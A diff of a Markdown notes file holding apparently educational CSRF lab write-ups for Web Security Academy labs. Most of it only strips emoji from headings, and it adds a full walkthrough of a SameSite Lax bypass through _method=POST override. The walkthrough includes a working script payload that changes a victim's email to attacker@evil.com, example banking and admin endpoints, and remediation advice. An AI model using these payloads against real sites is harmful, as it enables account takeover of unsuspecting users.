@@ -2,7 +2,7 @@
 
 ---
 
-## 🧠 🔥 Overview (Full Theory + Insight)
+## 🔥 Overview (Full Theory + Insight)
 
 This lab demonstrates a critical **CSRF (Cross-Site Request Forgery)** vulnerability where an attacker forces a logged-in user to change their email without consent.
 
@@ -22,13 +22,13 @@ The application relies **only on cookies for authentication** and does NOT valid
 
 ---
 
-## 🧠 🟦 Core Idea
+## 🧠 Core Idea
 
 If a request depends only on cookies → it can be forged from another site
 
 ---
 
-## 🧠 🟥 Key Exploit
+## 🧠 Key Exploit
 
 ```
 <form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
@@ -46,7 +46,7 @@ document.forms[0].submit();
 
 ---
 
-## 🔍 🧠 What Is This Topic?
+## 🔍 What Is This Topic?
 
 ### 🔹 CSRF (Cross-Site Request Forgery)
 
@@ -164,7 +164,7 @@ Cookie automatically attached
 
 ---
 
-## 💣 🟨 Payload Breakdown (Easy)
+## 💣 Payload Breakdown (Easy)
 
 ---
 
@@ -206,7 +206,7 @@ Executes request without user interaction
 
 ---
 
-## 🌍 🟥 Real-World Scenarios
+## 🌍 Real-World Scenarios
 
 ---
 
@@ -305,7 +305,7 @@ Permanent loss of user data
 
 ---
 
-## ⚠️ 🟥 Real-World Limitations + Bypass
+## ⚠️ Real-World Limitations + Bypass
 
 ---
 
@@ -344,7 +344,7 @@ Combine with XSS
 
 ---
 
-## 🛡️ 🔒 Remediation
+## 🛡️ Remediation
 
 ---
 
@@ -402,7 +402,7 @@ Only same-origin JS can send them
 
 ---
 
-## 🧠 🟪 Mental Model
+## 🧠 Mental Model
 
 ---
 
@@ -419,7 +419,7 @@ But can force actions
 
 ---
 
-## 🎯 🧠 Final Summary
+## 🎯 Final Summary
 
 ---
 
@@ -456,7 +456,7 @@ CSRF = forcing trusted actions through the victim’s browser
 
 ---
 
-## 🧠 🔥 Overview (Full Theory + Insight)
+## 🔥 Overview (Full Theory + Insight)
 
 This lab demonstrates a **CSRF bypass** where protection exists but is improperly enforced.
 
@@ -478,13 +478,13 @@ The server validates CSRF **only for POST requests** and ignores it for GET.
 
 ---
 
-## 🧠 🟦 Core Idea
+## 🧠 Core Idea
 
 If CSRF is enforced only on POST → switching to GET bypasses protection
 
 ---
 
-## 🧠 🟥 Key Exploit
+## 🧠 Key Exploit
 
 ```
 GET /my-account/change-email?email=attacker@evil.com
@@ -496,7 +496,7 @@ GET /my-account/change-email?email=attacker@evil.com
 
 ---
 
-## 🔍 🧠 What Is This Topic?
+## 🔍 What Is This Topic?
 
 ### 🔹 CSRF Method Bypass
 
@@ -635,7 +635,7 @@ Email changed without CSRF validation
 
 ---
 
-## 💣 🟨 Payload Breakdown (Easy)
+## 💣 Payload Breakdown (Easy)
 
 ---
 
@@ -673,7 +673,7 @@ document.forms[0].submit();
 
 ---
 
-## 🌍 🟥 Real-World Scenarios
+## 🌍 Real-World Scenarios
 
 ---
 
@@ -713,7 +713,7 @@ Only POST validated
 
 ---
 
-## ⚔️ 🧠 Attack Chain
+## ⚔️ Attack Chain
 
 ---
 
@@ -766,7 +766,7 @@ Only POST validated
 
 ---
 
-## ⚠️ 🟥 Real-World Limitations + Bypass
+## ⚠️ Real-World Limitations + Bypass
 
 ---
 
@@ -804,7 +804,7 @@ Look for inconsistent validation
 
 ---
 
-## 🛡️ 🔒 Remediation
+## 🛡️ Remediation
 
 ---
 
@@ -854,7 +854,7 @@ Require password for sensitive changes
 
 ---
 
-## 🧠 🟪 Mental Model
+## 🧠 Mental Model
 
 ---
 
@@ -868,7 +868,7 @@ If one method is weak → entire protection fails
 
 ---
 
-## 🎯 🧠 Final Summary
+## 🎯 Final Summary
 
 ---
 
@@ -892,7 +892,7 @@ CSRF protection on POST only = instant bypass via GET
 
 ---
 
-## 🧠 🔥 Overview (Full Theory + Insight)
+## 🔥 Overview (Full Theory + Insight)
 
 This lab demonstrates a flawed CSRF implementation where the server partially validates tokens.
 
@@ -914,13 +914,13 @@ The server validates the token **only if it exists**, but does NOT require it.
 
 ---
 
-## 🧠 🟦 Core Idea
+## 🧠 Core Idea
 
 If CSRF token is optional → protection is broken
 
 ---
 
-## 🧠 🟥 Key Exploit
+## 🧠 Key Exploit
 
 ```
 POST /my-account/change-email
@@ -934,7 +934,7 @@ email=attacker@evil.com
 
 ---
 
-## 🔍 🧠 What Is This Topic?
+## 🔍 What Is This Topic?
 
 ### 🔹 Missing CSRF Token Validation
 
@@ -942,7 +942,7 @@ A vulnerability where server checks token validity but fails to enforce its pres
 
 ---
 
-## 🧪 🟩 Lab Walkthrough (STEP-BY-STEP)
+## 🧪 Lab Walkthrough (STEP-BY-STEP)
 
 ---
 
@@ -1039,7 +1039,7 @@ Email changed without CSRF token
 
 ---
 
-## 💣 🟨 Payload Breakdown (Easy)
+## 💣 Payload Breakdown (Easy)
 
 ---
 
@@ -1079,7 +1079,7 @@ document.forms[0].submit();
 
 ---
 
-## 🌍 🟥 Real-World Scenarios
+## 🌍 Real-World Scenarios
 
 ---
 
@@ -1115,7 +1115,7 @@ Developer validates token but forgets to enforce presence
 
 ---
 
-## ⚔️ 🧠 Attack Chain
+## ⚔️ Attack Chain
 
 ---
 
@@ -1168,7 +1168,7 @@ Developer validates token but forgets to enforce presence
 
 ---
 
-## ⚠️ 🟥 Real-World Limitations + Bypass
+## ⚠️ Real-World Limitations + Bypass
 
 ---
 
@@ -1206,7 +1206,7 @@ Test optional parameters
 
 ---
 
-## 🛡️ 🔒 Remediation
+## 🛡️ Remediation
 
 ---
 
@@ -1256,7 +1256,7 @@ Implement proper CSRF middleware
 
 ---
 
-## 🧠 🟪 Mental Model
+## 🧠 Mental Model
 
 ---
 
@@ -1270,7 +1270,7 @@ This = broken protection
 
 ---
 
-## 🎯 🧠 Final Summary
+## 🎯 Final Summary
 
 ---
 
@@ -1320,13 +1320,13 @@ Tokens are valid **across different users**
 
 ---
 
-## 🧠 🟦 Core Idea
+## 🧠 Core Idea
 
 If CSRF token is reusable across users → protection is broken
 
 ---
 
-## 🧠 🟥 Key Exploit
+## 🧠 Key Exploit
 
 ```
 csrf=ATTACKER_TOKEN
@@ -1338,7 +1338,7 @@ csrf=ATTACKER_TOKEN
 
 ---
 
-## 🔍 🧠 What Is This Topic?
+## 🔍 What Is This Topic?
 
 ### 🔹 CSRF Token Not Bound to Session
 
@@ -1346,7 +1346,7 @@ A flaw where CSRF tokens are globally valid instead of user-specific
 
 ---
 
-## 🧪 🟩 Lab Walkthrough (STEP-BY-STEP)
+## 🧪 Lab Walkthrough (STEP-BY-STEP)
 
 ---
 
@@ -1471,7 +1471,7 @@ Email changed using reused CSRF token
 
 ---
 
-## 💣 🟨 Payload Breakdown (Easy)
+## 💣 Payload Breakdown (Easy)
 
 ---
 
@@ -1510,7 +1510,7 @@ document.forms[0].submit();
 
 ---
 
-## 🌍 🟥 Real-World Scenarios
+## 🌍 Real-World Scenarios
 
 ---
 
@@ -1546,7 +1546,7 @@ Token shared across users → full compromise
 
 ---
 
-## ⚔️ 🧠 Attack Chain
+## ⚔️ Attack Chain
 
 ---
 
@@ -1599,7 +1599,7 @@ Token shared across users → full compromise
 
 ---
 
-## ⚠️ 🟥 Real-World Limitations + Bypass
+## ⚠️ Real-World Limitations + Bypass
 
 ---
 
@@ -1637,7 +1637,7 @@ Test token reuse across roles
 
 ---
 
-## 🛡️ 🔒 Remediation
+## 🛡️ Remediation
 
 ---
 
@@ -1688,7 +1688,7 @@ Allow only same-site requests
 
 ---
 
-## 🧠 🟪 Mental Model
+## 🧠 Mental Model
 
 ---
 
@@ -1708,7 +1708,7 @@ Otherwise → reusable = broken
 
 ---
 
-## 🎯 🧠 Final Summary
+## 🎯 Final Summary
 
 ---
 
@@ -1765,13 +1765,13 @@ The application is vulnerable to **header injection**, allowing attackers to set
 
 ---
 
-## 🧠 🟦 Core Idea
+## 🧠 Core Idea
 
 If attacker controls CSRF validation inputs → protection is bypassed
 
 ---
 
-## 🧠 🟥 Key Exploit
+## 🧠 Key Exploit
 
 ```
 Set-Cookie: csrfKey=ATTACKER_VALUE
@@ -1787,7 +1787,7 @@ csrf=ATTACKER_VALUE
 
 ---
 
-## 🔍 🧠 What Is This Topic?
+## 🔍 What Is This Topic?
 
 ### 🔹 CSRF Token Bound to Non-Session Cookie
 
@@ -1795,7 +1795,7 @@ A flawed design where CSRF validation depends on a cookie not tied to the user s
 
 ---
 
-## 🧪 🟩 Lab Walkthrough (STEP-BY-STEP)
+## 🧪 Lab Walkthrough (STEP-BY-STEP)
 
 ---
 
@@ -1973,7 +1973,7 @@ Email changed via CSRF bypass
 
 ---
 
-## 💣 🟨 Payload Breakdown (Easy)
+## 💣 Payload Breakdown (Easy)
 
 ---
 
@@ -2019,7 +2019,7 @@ onerror="document.forms[0].submit()"
 
 ---
 
-## 🌍 🟥 Real-World Scenarios
+## 🌍 Real-World Scenarios
 
 ---
 
@@ -2158,7 +2158,7 @@ Chain with XSS
 
 ---
 
-## 🛡️ 🔒 Remediation
+## 🛡️ Remediation
 
 ---
 
@@ -2218,7 +2218,7 @@ Never use user input in Set-Cookie
 
 ---
 
-## 🧠 🟪 Mental Model
+## 🧠 Mental Model
 
 ---
 
@@ -2246,7 +2246,7 @@ controls csrfKey → controls validation
 
 ---
 
-## 🎯 🧠 Final Summary
+## 🎯 Final Summary
 
 ---
 
@@ -2298,13 +2298,13 @@ An attacker can manipulate both → bypass protection
 
 ---
 
-## 🧠 🟦 Core Idea
+## 🧠 Core Idea
 
 If attacker controls both cookie and request token → CSRF protection fails
 
 ---
 
-## 🧠 🟥 Key Exploit
+## 🧠 Key Exploit
 
 ```
 csrf=fake
@@ -2320,7 +2320,7 @@ cookie.csrf == request.csrf
 
 ---
 
-## 🔍 🧠 What Is This Topic?
+## 🔍 What Is This Topic?
 
 ### 🔹 Double Submit CSRF (Broken Implementation)
 
@@ -2494,7 +2494,7 @@ Email changed via CSRF bypass
 
 ---
 
-## 💣 🟨 Final Payload
+## 💣 Final Payload
 
 ```
 <form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
@@ -2508,7 +2508,7 @@ onerror="document.forms[0].submit();">
 
 ---
 
-## 💣 🟨 Payload Breakdown (Easy)
+## 💣 Payload Breakdown (Easy)
 
 ---
 
@@ -2561,7 +2561,7 @@ onerror="document.forms[0].submit();"
 
 ---
 
-## 🌍 🟥 Real-World Scenarios
+## 🌍 Real-World Scenarios
 
 ---
 
@@ -2605,7 +2605,7 @@ CRLF Injection → Cookie Control → CSRF Bypass
 
 ---
 
-## ⚔️ 🧠 Attack Chain
+## ⚔️ Attack Chain
 
 ---
 
@@ -2701,7 +2701,7 @@ Chain with XSS
 
 ---
 
-## 🛡️ 🔒 Remediation
+## 🛡️ Remediation
 
 ---
 
@@ -2759,7 +2759,7 @@ Per session or per request
 
 ---
 
-## 🧠 🟪 Mental Model
+## 🧠 Mental Model
 
 ---
 
@@ -2783,7 +2783,7 @@ If attacker controls both sides → protection fails
 
 ---
 
-## 🎯 🧠 Final Summary
+## 🎯Final Summary
 
 ---
 
@@ -2802,3 +2802,459 @@ If attacker controls both sides → protection fails
 ---
 
 If attacker controls both cookie and request token → CSRF protection is useless
+
+---
+
+# 🐞 Lab-7 — CSRF → SameSite Lax Bypass via Method Override
+
+---
+
+## 🔥 Overview (Full Theory + Insight)
+
+This lab demonstrates a CSRF vulnerability where protection relies only on **SameSite=Lax cookies**, and is bypassed using **HTTP method override**.
+
+---
+
+Normally:
+
+CSRF protection requires tokens or strict validation.
+
+---
+
+However, in this lab:
+
+✔ No CSRF token  
+✔ Cookies rely on SameSite=Lax  
+✔ Server supports `_method=POST` override  
+
+---
+
+👉 Attacker uses GET (to include cookies) + `_method=POST` (to execute action)
+
+---
+
+## 🧠 Core Idea
+
+If SameSite blocks POST → attacker uses GET  
+If server blocks GET → attacker fakes POST using `_method`
+
+---
+
+## 🧠 Key Exploit
+
+```
+/my-account/change-email?email=attacker@evil.com&_method=POST
+```
+
+---
+
+👉 Executed via GET → treated as POST by server
+
+---
+
+## 🔍 What Is This Topic?
+
+### 🔹 SameSite Lax Bypass + Method Override
+
+A CSRF bypass where GET requests include cookies and `_method` tricks server logic
+
+---
+
+## 🧪 Lab Walkthrough (STEP-BY-STEP)
+
+---
+
+### 🧩 Step 1 — Capture Change Email Request
+
+Login:
+
+```
+wiener : peter
+```
+
+---
+
+Captured request:
+
+```
+POST /my-account/change-email
+
+email=test@abc.com
+```
+
+---
+
+![no-csrf-token](../images/no-csrf-token.png)
+
+---
+
+### 🧠 Observation
+
+```
+No CSRF token present
+```
+
+---
+
+### 🧩 Step 2 — Check Cookie Behavior
+
+Inspect login response:
+
+```
+Set-Cookie: session=XYZ
+```
+
+---
+
+![no-samesite](../images/no-samesite.png)
+
+---
+
+### 🧠 Observation
+
+```
+No SameSite attribute
+→ Default = SameSite=Lax
+```
+
+---
+
+### 🧩 Step 3 — Test GET Request
+
+```
+GET /my-account/change-email?email=test@abc.com
+```
+
+---
+
+👉 Result:
+
+```
+Method Not Allowed
+```
+
+---
+
+![get-method-blocked](../images/get-method-blocked.png)
+
+---
+
+### 🧠 Insight
+
+```
+GET blocked → cannot directly exploit
+```
+
+---
+
+### 🧩 Step 4 — Use Method Override
+
+```
+GET /my-account/change-email?email=test@abc.com&_method=POST
+```
+
+---
+
+👉 Result:
+
+✔ Request accepted  
+✔ Email changed  
+
+---
+
+### 🧠 Key Observation
+
+```
+Browser sends GET
+Server processes as POST
+```
+
+---
+
+### 🧩 Step 5 — Build Exploit
+
+```
+<script>
+document.location = "https://LAB-ID.web-security-academy.net/my-account/change-email?email=attacker@evil.com&_method=POST";
+</script>
+```
+
+---
+
+### 🧩 Step 6 — Deliver Exploit
+
+```
+Victim visits attacker page
+```
+
+---
+
+👉 Execution:
+
+✔ GET navigation  
+✔ Cookies included  
+✔ Server treats as POST  
+
+---
+
+### 🧩 Step 7 — Result
+
+```
+Email changed via CSRF
+```
+
+---
+
+## 💣 Payload Breakdown (Easy)
+
+---
+
+### 🔹 Navigation Trigger
+
+```
+document.location = "URL"
+```
+
+---
+
+✔ Forces top-level GET request  
+
+---
+
+### 🔹 Query Parameters
+
+```
+email=attacker@evil.com
+_method=POST
+```
+
+---
+
+✔ Defines action  
+✔ Overrides method  
+
+---
+
+### 🔹 Combined Effect
+
+```
+GET → cookies sent
+_method=POST → action executed
+```
+
+---
+
+## 🌍 Real-World Scenarios
+
+---
+
+### 🔥 Scenario 1 — Banking Apps
+
+```
+/transfer?amount=5000&_method=POST
+```
+
+---
+
+### 🔥 Scenario 2 — Account Takeover
+
+```
+Change email → reset password
+```
+
+---
+
+### 🔥 Scenario 3 — SaaS Platforms
+
+```
+Modify billing / API keys
+```
+
+---
+
+### 🔥 Scenario 4 — Admin Abuse
+
+```
+/admin/create-user?_method=POST
+```
+
+---
+
+## ⚔️ Attack Chain
+
+---
+
+1️⃣ Capture request  
+2️⃣ Confirm no CSRF token  
+3️⃣ Identify SameSite=Lax  
+4️⃣ Test GET request  
+5️⃣ Observe method restriction  
+6️⃣ Use `_method=POST`  
+7️⃣ Build exploit  
+8️⃣ Victim loads page  
+9️⃣ Action executed  
+
+---
+
+## 🎯 High-Value Endpoints
+
+---
+
+### 🔹 Account
+
+```
+/change-email
+/change-password
+```
+
+---
+
+### 🔹 Financial
+
+```
+/transfer-money
+/add-beneficiary
+```
+
+---
+
+### 🔹 Admin
+
+```
+/admin/create-user
+/admin/delete-user
+```
+
+---
+
+### 🔹 API
+
+```
+/api/update-profile
+```
+
+---
+
+## ⚠️ Real-World Limitations + Bypass
+
+---
+
+### ❌ No Method Override Support
+
+👉 Attack fails
+
+---
+
+### ❌ SameSite=Strict
+
+👉 Cookies not sent
+
+---
+
+### ❌ CSRF Token Present
+
+👉 Request rejected
+
+---
+
+### ❌ Origin / Referer Validation
+
+👉 Blocked
+
+---
+
+### ✅ Bypass Ideas
+
+```
+Look for alternate override params
+Combine with open redirects
+Chain with XSS
+```
+
+---
+
+## 🛡️Remediation
+
+---
+
+### 🔴 Root Problem
+
+Reliance on SameSite without proper CSRF protection
+
+---
+
+### ✅ Fix 1 — Implement CSRF Tokens
+
+```
+Unique + session-bound
+```
+
+---
+
+### ✅ Fix 2 — Disable Method Override
+
+```
+Reject _method usage
+```
+
+---
+
+### ✅ Fix 3 — Enforce HTTP Methods
+
+```
+POST endpoints must reject GET
+```
+
+---
+
+### ✅ Fix 4 — Use SameSite=Strict
+
+```
+Stronger cookie policy
+```
+
+---
+
+### ✅ Fix 5 — Validate Origin / Referer
+
+```
+Allow only same-site requests
+```
+
+---
+
+## 🧠 Mental Model
+
+---
+
+SameSite blocks POST  
+
+→ attacker uses GET  
+
+---
+
+Server blocks GET  
+
+→ attacker fakes POST  
+
+---
+
+## 🎯Final Summary
+
+---
+
+✔ No CSRF token  
+
+✔ SameSite=Lax used incorrectly  
+
+✔ Method override bypasses restriction  
+
+✔ Full CSRF achieved  
+
+---
+
+## 🔥 Final One-Liner
+
+---
+
+Use GET to send cookies + `_method=POST` to execute action → bypass SameSite CSRF protection
